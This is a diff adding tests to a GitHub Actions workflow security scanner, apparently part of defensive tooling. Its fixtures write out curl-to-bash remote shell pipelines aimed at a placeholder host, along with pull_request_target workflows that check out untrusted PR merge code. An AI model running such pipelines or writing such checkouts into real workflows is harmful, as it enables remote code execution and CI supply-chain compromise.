@@ -969,3 +969,42 @@ test('Codex P2: fake continued pipeline inside name block is non-executable',()=
  const r=scan(yaml);
  assert.ok(!rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
 });
+
+test('RED P1: format refs/pull merge PR number cannot evade privileged checkout',()=>{
+ const y=['on: pull_request_target','jobs:','  audit:','    steps:',
+  '      - uses: actions/checkout@'+SHA,
+  '        with:','          ref: ${{ format("refs/pull/{0}/merge", github.event.pull_request.number) }}'].join('\n');
+ assert.ok(rules(scan(y)).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(scan(y)));
+});
+test('RED P1: block-indented ref >2- reconstructs dynamic PR merge checkout',()=>{
+ const y=['on: pull_request_target','jobs:','  audit:','    steps:',
+ '      - uses: actions/checkout@'+SHA,
+ '        with:','          ref: >2-',
+ '            refs/pull/${{ github.event.pull_request.number }}/merge'].join('\n');
+ assert.ok(rules(scan(y)).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(scan(y)));
+});
+test('RED P2: literal shell continuation must join ba backslash sh without a space',()=>{
+ const y=['on: push','jobs:','  audit:','    steps:',
+ '      - run: |',
+ '          curl https://example.invalid/payload | ba\\',
+ '          sh'].join('\n');
+ assert.ok(rules(scan(y)).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(scan(y)));
+});
+test('RED P2: Bash |& bash is a remote shell pipeline',()=>{
+ const y=['on: push','jobs:','  audit:','    steps:',
+  '      - run: curl https://example.invalid/payload |& bash'].join('\n');
+ assert.ok(rules(scan(y)).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(scan(y)));
+});
+test('negative: normal branch ref using pull request number is not synthetic PR checkout',()=>{
+ const y=['on: pull_request_target','jobs:','  audit:','    steps:',
+  '      - uses: actions/checkout@'+SHA,'        with:',
+  '          ref: "refs/heads/release-${{ github.event.pull_request.number }}"'].join('\n');
+ assert.ok(!rules(scan(y)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
+});
+test('negative: pipeline text in name and environment is inert',()=>{
+ const y=['on: push','jobs:','  audit:','    steps:',
+  '      - name: "curl URL |& bash"',
+  '        env:', '          DESCR: "wget URL |& sh"',
+  '        run: echo normal'].join('\n');
+ assert.ok(!rules(scan(y)).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(scan(y)));
+});
